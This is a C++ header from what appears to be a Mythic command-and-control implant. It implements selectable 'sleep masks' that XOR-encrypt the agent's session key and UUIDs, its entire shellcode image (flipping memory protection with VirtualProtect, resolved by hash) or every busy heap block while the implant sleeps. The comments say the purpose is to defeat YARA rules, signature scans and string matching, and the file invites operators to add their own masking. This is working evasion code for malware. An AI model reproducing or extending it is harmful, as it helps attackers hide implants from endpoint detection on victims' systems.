#ifndef STARBURST_EVASION_SLEEP_MASKS_H
#define STARBURST_EVASION_SLEEP_MASKS_H

/*
 * Sleep masks - operator-customizable data masking during sleep.
 *
 * This file provides compile-time selectable masking implementations
 * for evasion_pre_sleep() and evasion_post_sleep(). The pattern follows
 * spoof_profiles.h: preprocessor selection via SLEEP_MASK_TYPE.
 *
 * WORKFLOW - Swapping masks:
 *
 *   1. Select a mask type in the Mythic build dialog, or set
 *      #define SLEEP_MASK_TYPE MASK_* in config.h for manual builds.
 *
 *   2. For MASK_CUSTOM, edit the custom section below with your own
 *      masking logic. Must implement mask_pre_sleep() and mask_post_sleep().
 *
 * AVAILABLE MASKS:
 *
 *   MASK_DEFAULT     - XOR sensitive fields only (AES key + UUIDs, ~104 bytes)
 *   MASK_FULL_IMAGE  - XOR entire shellcode image (VirtualProtect RW↔RX flip)
 *   MASK_HEAP        - XOR sensitive fields + all heap allocations
 *   MASK_CUSTOM      - Operator-defined masking logic
 *
 * NOTE: Ekko-style masking (timer queue ROP) replaces the entire sleep cycle,
 * not just pre/post. For Ekko, the operator must modify the beacon loop in
 * main.cc directly. See the arsenal kit's mask_ekko.h for a reference.
 */

#include <constexpr.h>
#include <stdint.h>

#define MASK_DEFAULT    0
#define MASK_FULL_IMAGE 1
#define MASK_HEAP       2
#define MASK_CUSTOM     3

#ifndef SLEEP_MASK_TYPE
#define SLEEP_MASK_TYPE MASK_DEFAULT
#endif


#if SLEEP_MASK_TYPE == MASK_DEFAULT

/* ── Default: XOR sensitive fields only ──
 * Masks AES-256 session key (32 bytes) and both UUIDs (36 bytes each).
 * Lightweight - only ~104 bytes touched. Agent code and heap remain plaintext.
 */
static auto declfn mask_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
}


#elif SLEEP_MASK_TYPE == MASK_FULL_IMAGE

/* ── Full image: XOR entire shellcode region ──
 * Masks all code and embedded data in the shellcode image.
 * Defeats YARA rules, signature scans, and string matching during sleep.
 * Requires VirtualProtect RX→RW→RX flip - generates ETW telemetry.
 */

static auto declfn xor_image(
    instance& inst, uintptr_t skip_base, uint32_t skip_size
) -> void {
    auto base = reinterpret_cast<uint8_t*>( inst.evasion.ekko.img_base );
    auto size = inst.evasion.ekko.img_size;
    auto key  = inst.evasion.ekko.rc4_key;

    for ( uint32_t i = 0; i < size; i++ ) {
        uintptr_t addr = reinterpret_cast<uintptr_t>( base + i );
        if ( skip_base && addr >= skip_base && addr < skip_base + skip_size )
            continue;
        base[i] ^= key[ i % 16 ];
    }
}

static auto declfn flip_protection(
    instance& inst, DWORD new_protect
) -> DWORD {
    typedef BOOL (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

    auto pVirtualProtect = reinterpret_cast<fn_VirtualProtect>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "VirtualProtect" ) ) );
    if ( !pVirtualProtect ) return 0;

    DWORD old_protect = 0;
    pVirtualProtect(
        reinterpret_cast<LPVOID>( inst.evasion.ekko.img_base ),
        inst.evasion.ekko.img_size,
        new_protect,
        &old_protect
    );
    return old_protect;
}

static auto declfn mask_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
    flip_protection( inst, PAGE_READWRITE );
    uintptr_t self = reinterpret_cast<uintptr_t>( &mask_pre_sleep );
    xor_image( inst, self, 0x100 );
    flip_protection( inst, PAGE_EXECUTE_READ );
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    flip_protection( inst, PAGE_READWRITE );
    uintptr_t self = reinterpret_cast<uintptr_t>( &mask_post_sleep );
    xor_image( inst, self, 0x100 );
    flip_protection( inst, PAGE_EXECUTE_READ );
    xor_sensitive_data( inst );
}


#elif SLEEP_MASK_TYPE == MASK_HEAP

/* ── Heap: XOR sensitive fields + all heap allocations ──
 * Walks HeapWalk() over GetProcessHeap() and XOR-masks all BUSY blocks.
 * Catches dynamically allocated buffers (task data, downloaded files, etc.)
 * No VirtualProtect calls needed - heap is already RW.
 * Agent code (.text) remains plaintext.
 */

typedef BOOL (WINAPI *fn_HeapWalk)( HANDLE, LPPROCESS_HEAP_ENTRY );
typedef HANDLE (WINAPI *fn_GetProcessHeap)( void );

static auto declfn xor_heap_blocks( instance& inst ) -> void {
    auto pGetProcessHeap = reinterpret_cast<fn_GetProcessHeap>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "GetProcessHeap" ) ) );
    auto pHeapWalk = reinterpret_cast<fn_HeapWalk>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "HeapWalk" ) ) );

    if ( !pGetProcessHeap || !pHeapWalk ) return;

    HANDLE heap = pGetProcessHeap();
    if ( !heap ) return;

    auto key = inst.evasion.ekko.rc4_key;
    PROCESS_HEAP_ENTRY entry = {};
    while ( pHeapWalk( heap, &entry ) ) {
        if ( !( entry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) ) continue;
        if ( entry.cbData < 16 ) continue;

        auto block_start = reinterpret_cast<uintptr_t>( entry.lpData );
        auto key_start   = reinterpret_cast<uintptr_t>( inst.evasion.ekko.rc4_key );
        if ( block_start <= key_start &&
             key_start < block_start + entry.cbData )
            continue;

        auto data = reinterpret_cast<uint8_t*>( entry.lpData );
        for ( uint32_t i = 0; i < entry.cbData; i++ ) {
            data[i] ^= key[ i % 16 ];
        }
    }
}

static auto declfn mask_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
    xor_heap_blocks( inst );
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_heap_blocks( inst );
    xor_sensitive_data( inst );
}


#elif SLEEP_MASK_TYPE == MASK_CUSTOM

/* ── Custom mask ── OPERATOR: edit below ──
 *
 * Implement your own masking logic. Must provide mask_pre_sleep() and
 * mask_post_sleep() with matching signatures.
 *
 * Ideas:
 *   - Full image + heap combined
 *   - Selective section masking (mask .rdata but not .text)
 *   - Custom encryption (RC4/AES instead of XOR)
 *   - Stack masking for sensitive local variables
 *
 * xor_sensitive_data(inst) is available - call it for baseline field protection.
 */

static auto declfn mask_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    /* OPERATOR: Add your pre-sleep masking here */
    xor_sensitive_data( inst );
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    /* OPERATOR: Add your post-sleep masking here */
    xor_sensitive_data( inst );
}

#endif

#endif
